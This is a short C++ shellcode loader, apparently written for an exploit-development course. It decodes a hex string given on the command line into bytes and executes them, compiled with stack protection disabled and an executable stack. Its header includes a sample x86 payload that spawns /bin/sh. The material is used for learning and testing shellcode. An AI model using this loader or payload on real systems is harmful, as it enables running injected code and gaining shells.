// Filename: shellcode_loader.cpp
// Author: Upayan a.k.a. slaeryan
// SLAE: 1525
// Contact: upayansaha@icloud.com
// Purpose: This loader program is fed an input shellcode hex string as console 
// argument. It converts it into shellcode byte string and prints the shellcode 
// length and executes it.
// Compile with:
// g++ -fno-stack-protector -z execstack shellcode_loader.cpp -o shellcode_loader
// Testing: 31c050682f2f7368682f62696e89e3505389e1b00bcd80

#include <stdio.h>
#include <string.h>
#include <malloc.h>

int main(int argc, char* argv[])
{
	unsigned char* shellcode_hex = (unsigned char*)argv[1];
    const char *buffer = (const char *)shellcode_hex;
    int shellcode_length = strlen((const char *)shellcode_hex);
    unsigned char *shellcode = (unsigned char *)calloc(shellcode_length / 2, sizeof(unsigned char));
    for (size_t count = 0; count < shellcode_length / 2; count++)
    {
        sscanf(buffer, "%2hhx", &shellcode[count]);
        buffer += 2;
    }
	printf("The Shellcode Length is:  %d\n", strlen((const char*)shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}